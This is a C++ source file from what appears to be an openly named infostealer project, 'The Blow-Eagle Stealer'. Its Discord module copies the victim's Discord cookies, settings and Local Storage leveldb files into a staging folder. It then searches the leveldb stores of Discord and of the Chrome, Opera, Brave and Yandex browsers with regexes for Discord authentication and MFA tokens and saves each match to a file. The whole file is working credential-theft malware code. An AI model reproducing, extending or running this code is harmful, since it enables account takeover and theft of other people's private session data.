/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include  "../../helper/helper.h"
#include <fstream>
#include <sys/stat.h>
#include <regex>
#include <vector>

void TokenGrabber();

bool hasEnding(std::string const& fullString, std::string const& ending);
bool pathExist(const std::string& s);
std::vector<std::string> grabPath();
void getToken(const std::string& path);
void searchToken(const std::string& loc);

std::string user = func::GetUser();

std::string local = "C:/Users/" + user + "/AppData/Local";

std::string roaming = "C:/Users/" + user + "/AppData/Roaming";

void messengers::Discord()
{

	printf("Discord\n");

	if (std::filesystem::exists("C:/Users/" + user + "/AppData/Local" + "/discord"))
	{
		

		std::string files[] = {
		 "discord/Network/Cookies",
		 "discord/settings.json"
		};
		std::string dirs[] =
		{
			"discord/Local Storage/leveldb"
		};

		std::string defaultPaths[] = {

		"C:/Users/" + user + config::path + "/Messengers",
		"C:/Users/" + user + config::path + "/Messengers/Discord",
		"C:/Users/" + user + config::path + "/Messengers/Discord/Local Storage",
		"C:/Users/" + user + config::path + "/Messengers/Discord/Local Storage/leveldb"
		};

		for (size_t i = 0; i < std::size(defaultPaths); i++)
		{
			int result = _mkdir(defaultPaths[i].c_str());
		}

		for (size_t i = 0; i < std::size(files); i++)
		{
			try 
			{
				func::copyFile(roaming +'/' + files[i], defaultPaths[1]);
			}	
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}
		}

		for (size_t i = 0; i < std::size(dirs); i++)
		{
			try
			{
				func::copyDirectory(roaming + '/' + dirs[i], defaultPaths[3]);
			}
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}
		}
		if (config::dsTokenGrab)
			TokenGrabber();
	}

}

void TokenGrabber() 
{
	printf("TG\n");

	try
	{
		std::vector<std::string> targetLocation = grabPath();
		for (int i = 0; i < targetLocation.size(); i++) {
			if (pathExist(targetLocation[i])) {
				std::cout << targetLocation[i] << "\n";
				getToken(targetLocation[i]);
			}
		}
	}
	catch (const char* error_message)
	{
		std::cout << error_message << std::endl;
	}

}


bool hasEnding(std::string const& fullString, std::string const& ending) 
{
	if (fullString.length() >= ending.length()) {
		return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
	}
	else {
		return false;
	}
}

bool pathExist(const std::string& s)
{
	struct stat buffer;
	return (stat(s.c_str(), &buffer) == 0);
}


std::vector<std::string> grabPath()
{
	printf("grabPath\n");

	std::vector<std::string> targetLocations;

	std::string Discord = std::string(roaming) + "\\Discord";
	std::string DiscordCanary = std::string(roaming) + "\\discordcanary";
	std::string DiscordPTB = std::string(roaming) + "\\discordptb";
	std::string Opera = std::string(roaming) + "\\Opera Software\\Opera Stable";
	std::string Chrome = std::string(local) + "\\Google\\Chrome\\User Data\\Default";
	std::string Brave = std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
	std::string Yandex = std::string(local) + "\\Yandex\\YandexBrowser\\User Data\\Default";

	targetLocations.push_back(Discord);
	targetLocations.push_back(DiscordCanary);
	targetLocations.push_back(DiscordPTB);
	targetLocations.push_back(Opera);
	targetLocations.push_back(Chrome);
	targetLocations.push_back(Brave);
	targetLocations.push_back(Yandex);

	return targetLocations;
}

std::vector<std::string> findMatch(std::string str, std::regex reg)
{
	std::vector<std::string> output;
	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
	std::sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		std::smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}

	return output;
}


void getToken(const std::string& path)
{
	printf("getToken\n");

	std::string target = path + "\\Local Storage\\leveldb";

	for (const auto& entry : std::filesystem::directory_iterator(target))
	{
		
		std::string strPath = entry.path().u8string();
		std::cout << strPath << "\n";

		if (hasEnding(strPath, ".log"))
		{
			searchToken(strPath);
		}

		if (hasEnding(strPath, ".ldb"))
		{
			searchToken(strPath);
		}
	}
}

void searchToken(const std::string& loc) {

	printf("searchToken\n");

	std::ifstream ifs(loc, std::ios_base::binary);
	std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));

	std::vector<std::string> master;

	std::regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
	std::regex reg2("mfa\\.[\\w-]{84}");

	std::vector<std::string> check = findMatch(content, reg1);
	std::vector<std::string> check2 = findMatch(content, reg2);

	for (int i = 0; i < check.size(); i++) {
		std::cout << check[i] << std::endl;
		master.push_back(check[i]);
	}
	for (int i = 0; i < check2.size(); i++) {
		std::cout << check2[i] << std::endl;
		master.push_back(check2[i]);
	}

	for (int i = 0; i < master.size(); i++) {
		std::string combine = "content=";
		combine += "```" + master[i] + "```";
		const char* postContent = combine.c_str();
		std::ofstream file("C:/Users/" + user + config::path + "/Messengers/Discord/token-grabber.txt", std::ios::app);
		if (file.is_open())
		{
			file << postContent << std::endl;
		}

		file.close();
	}
}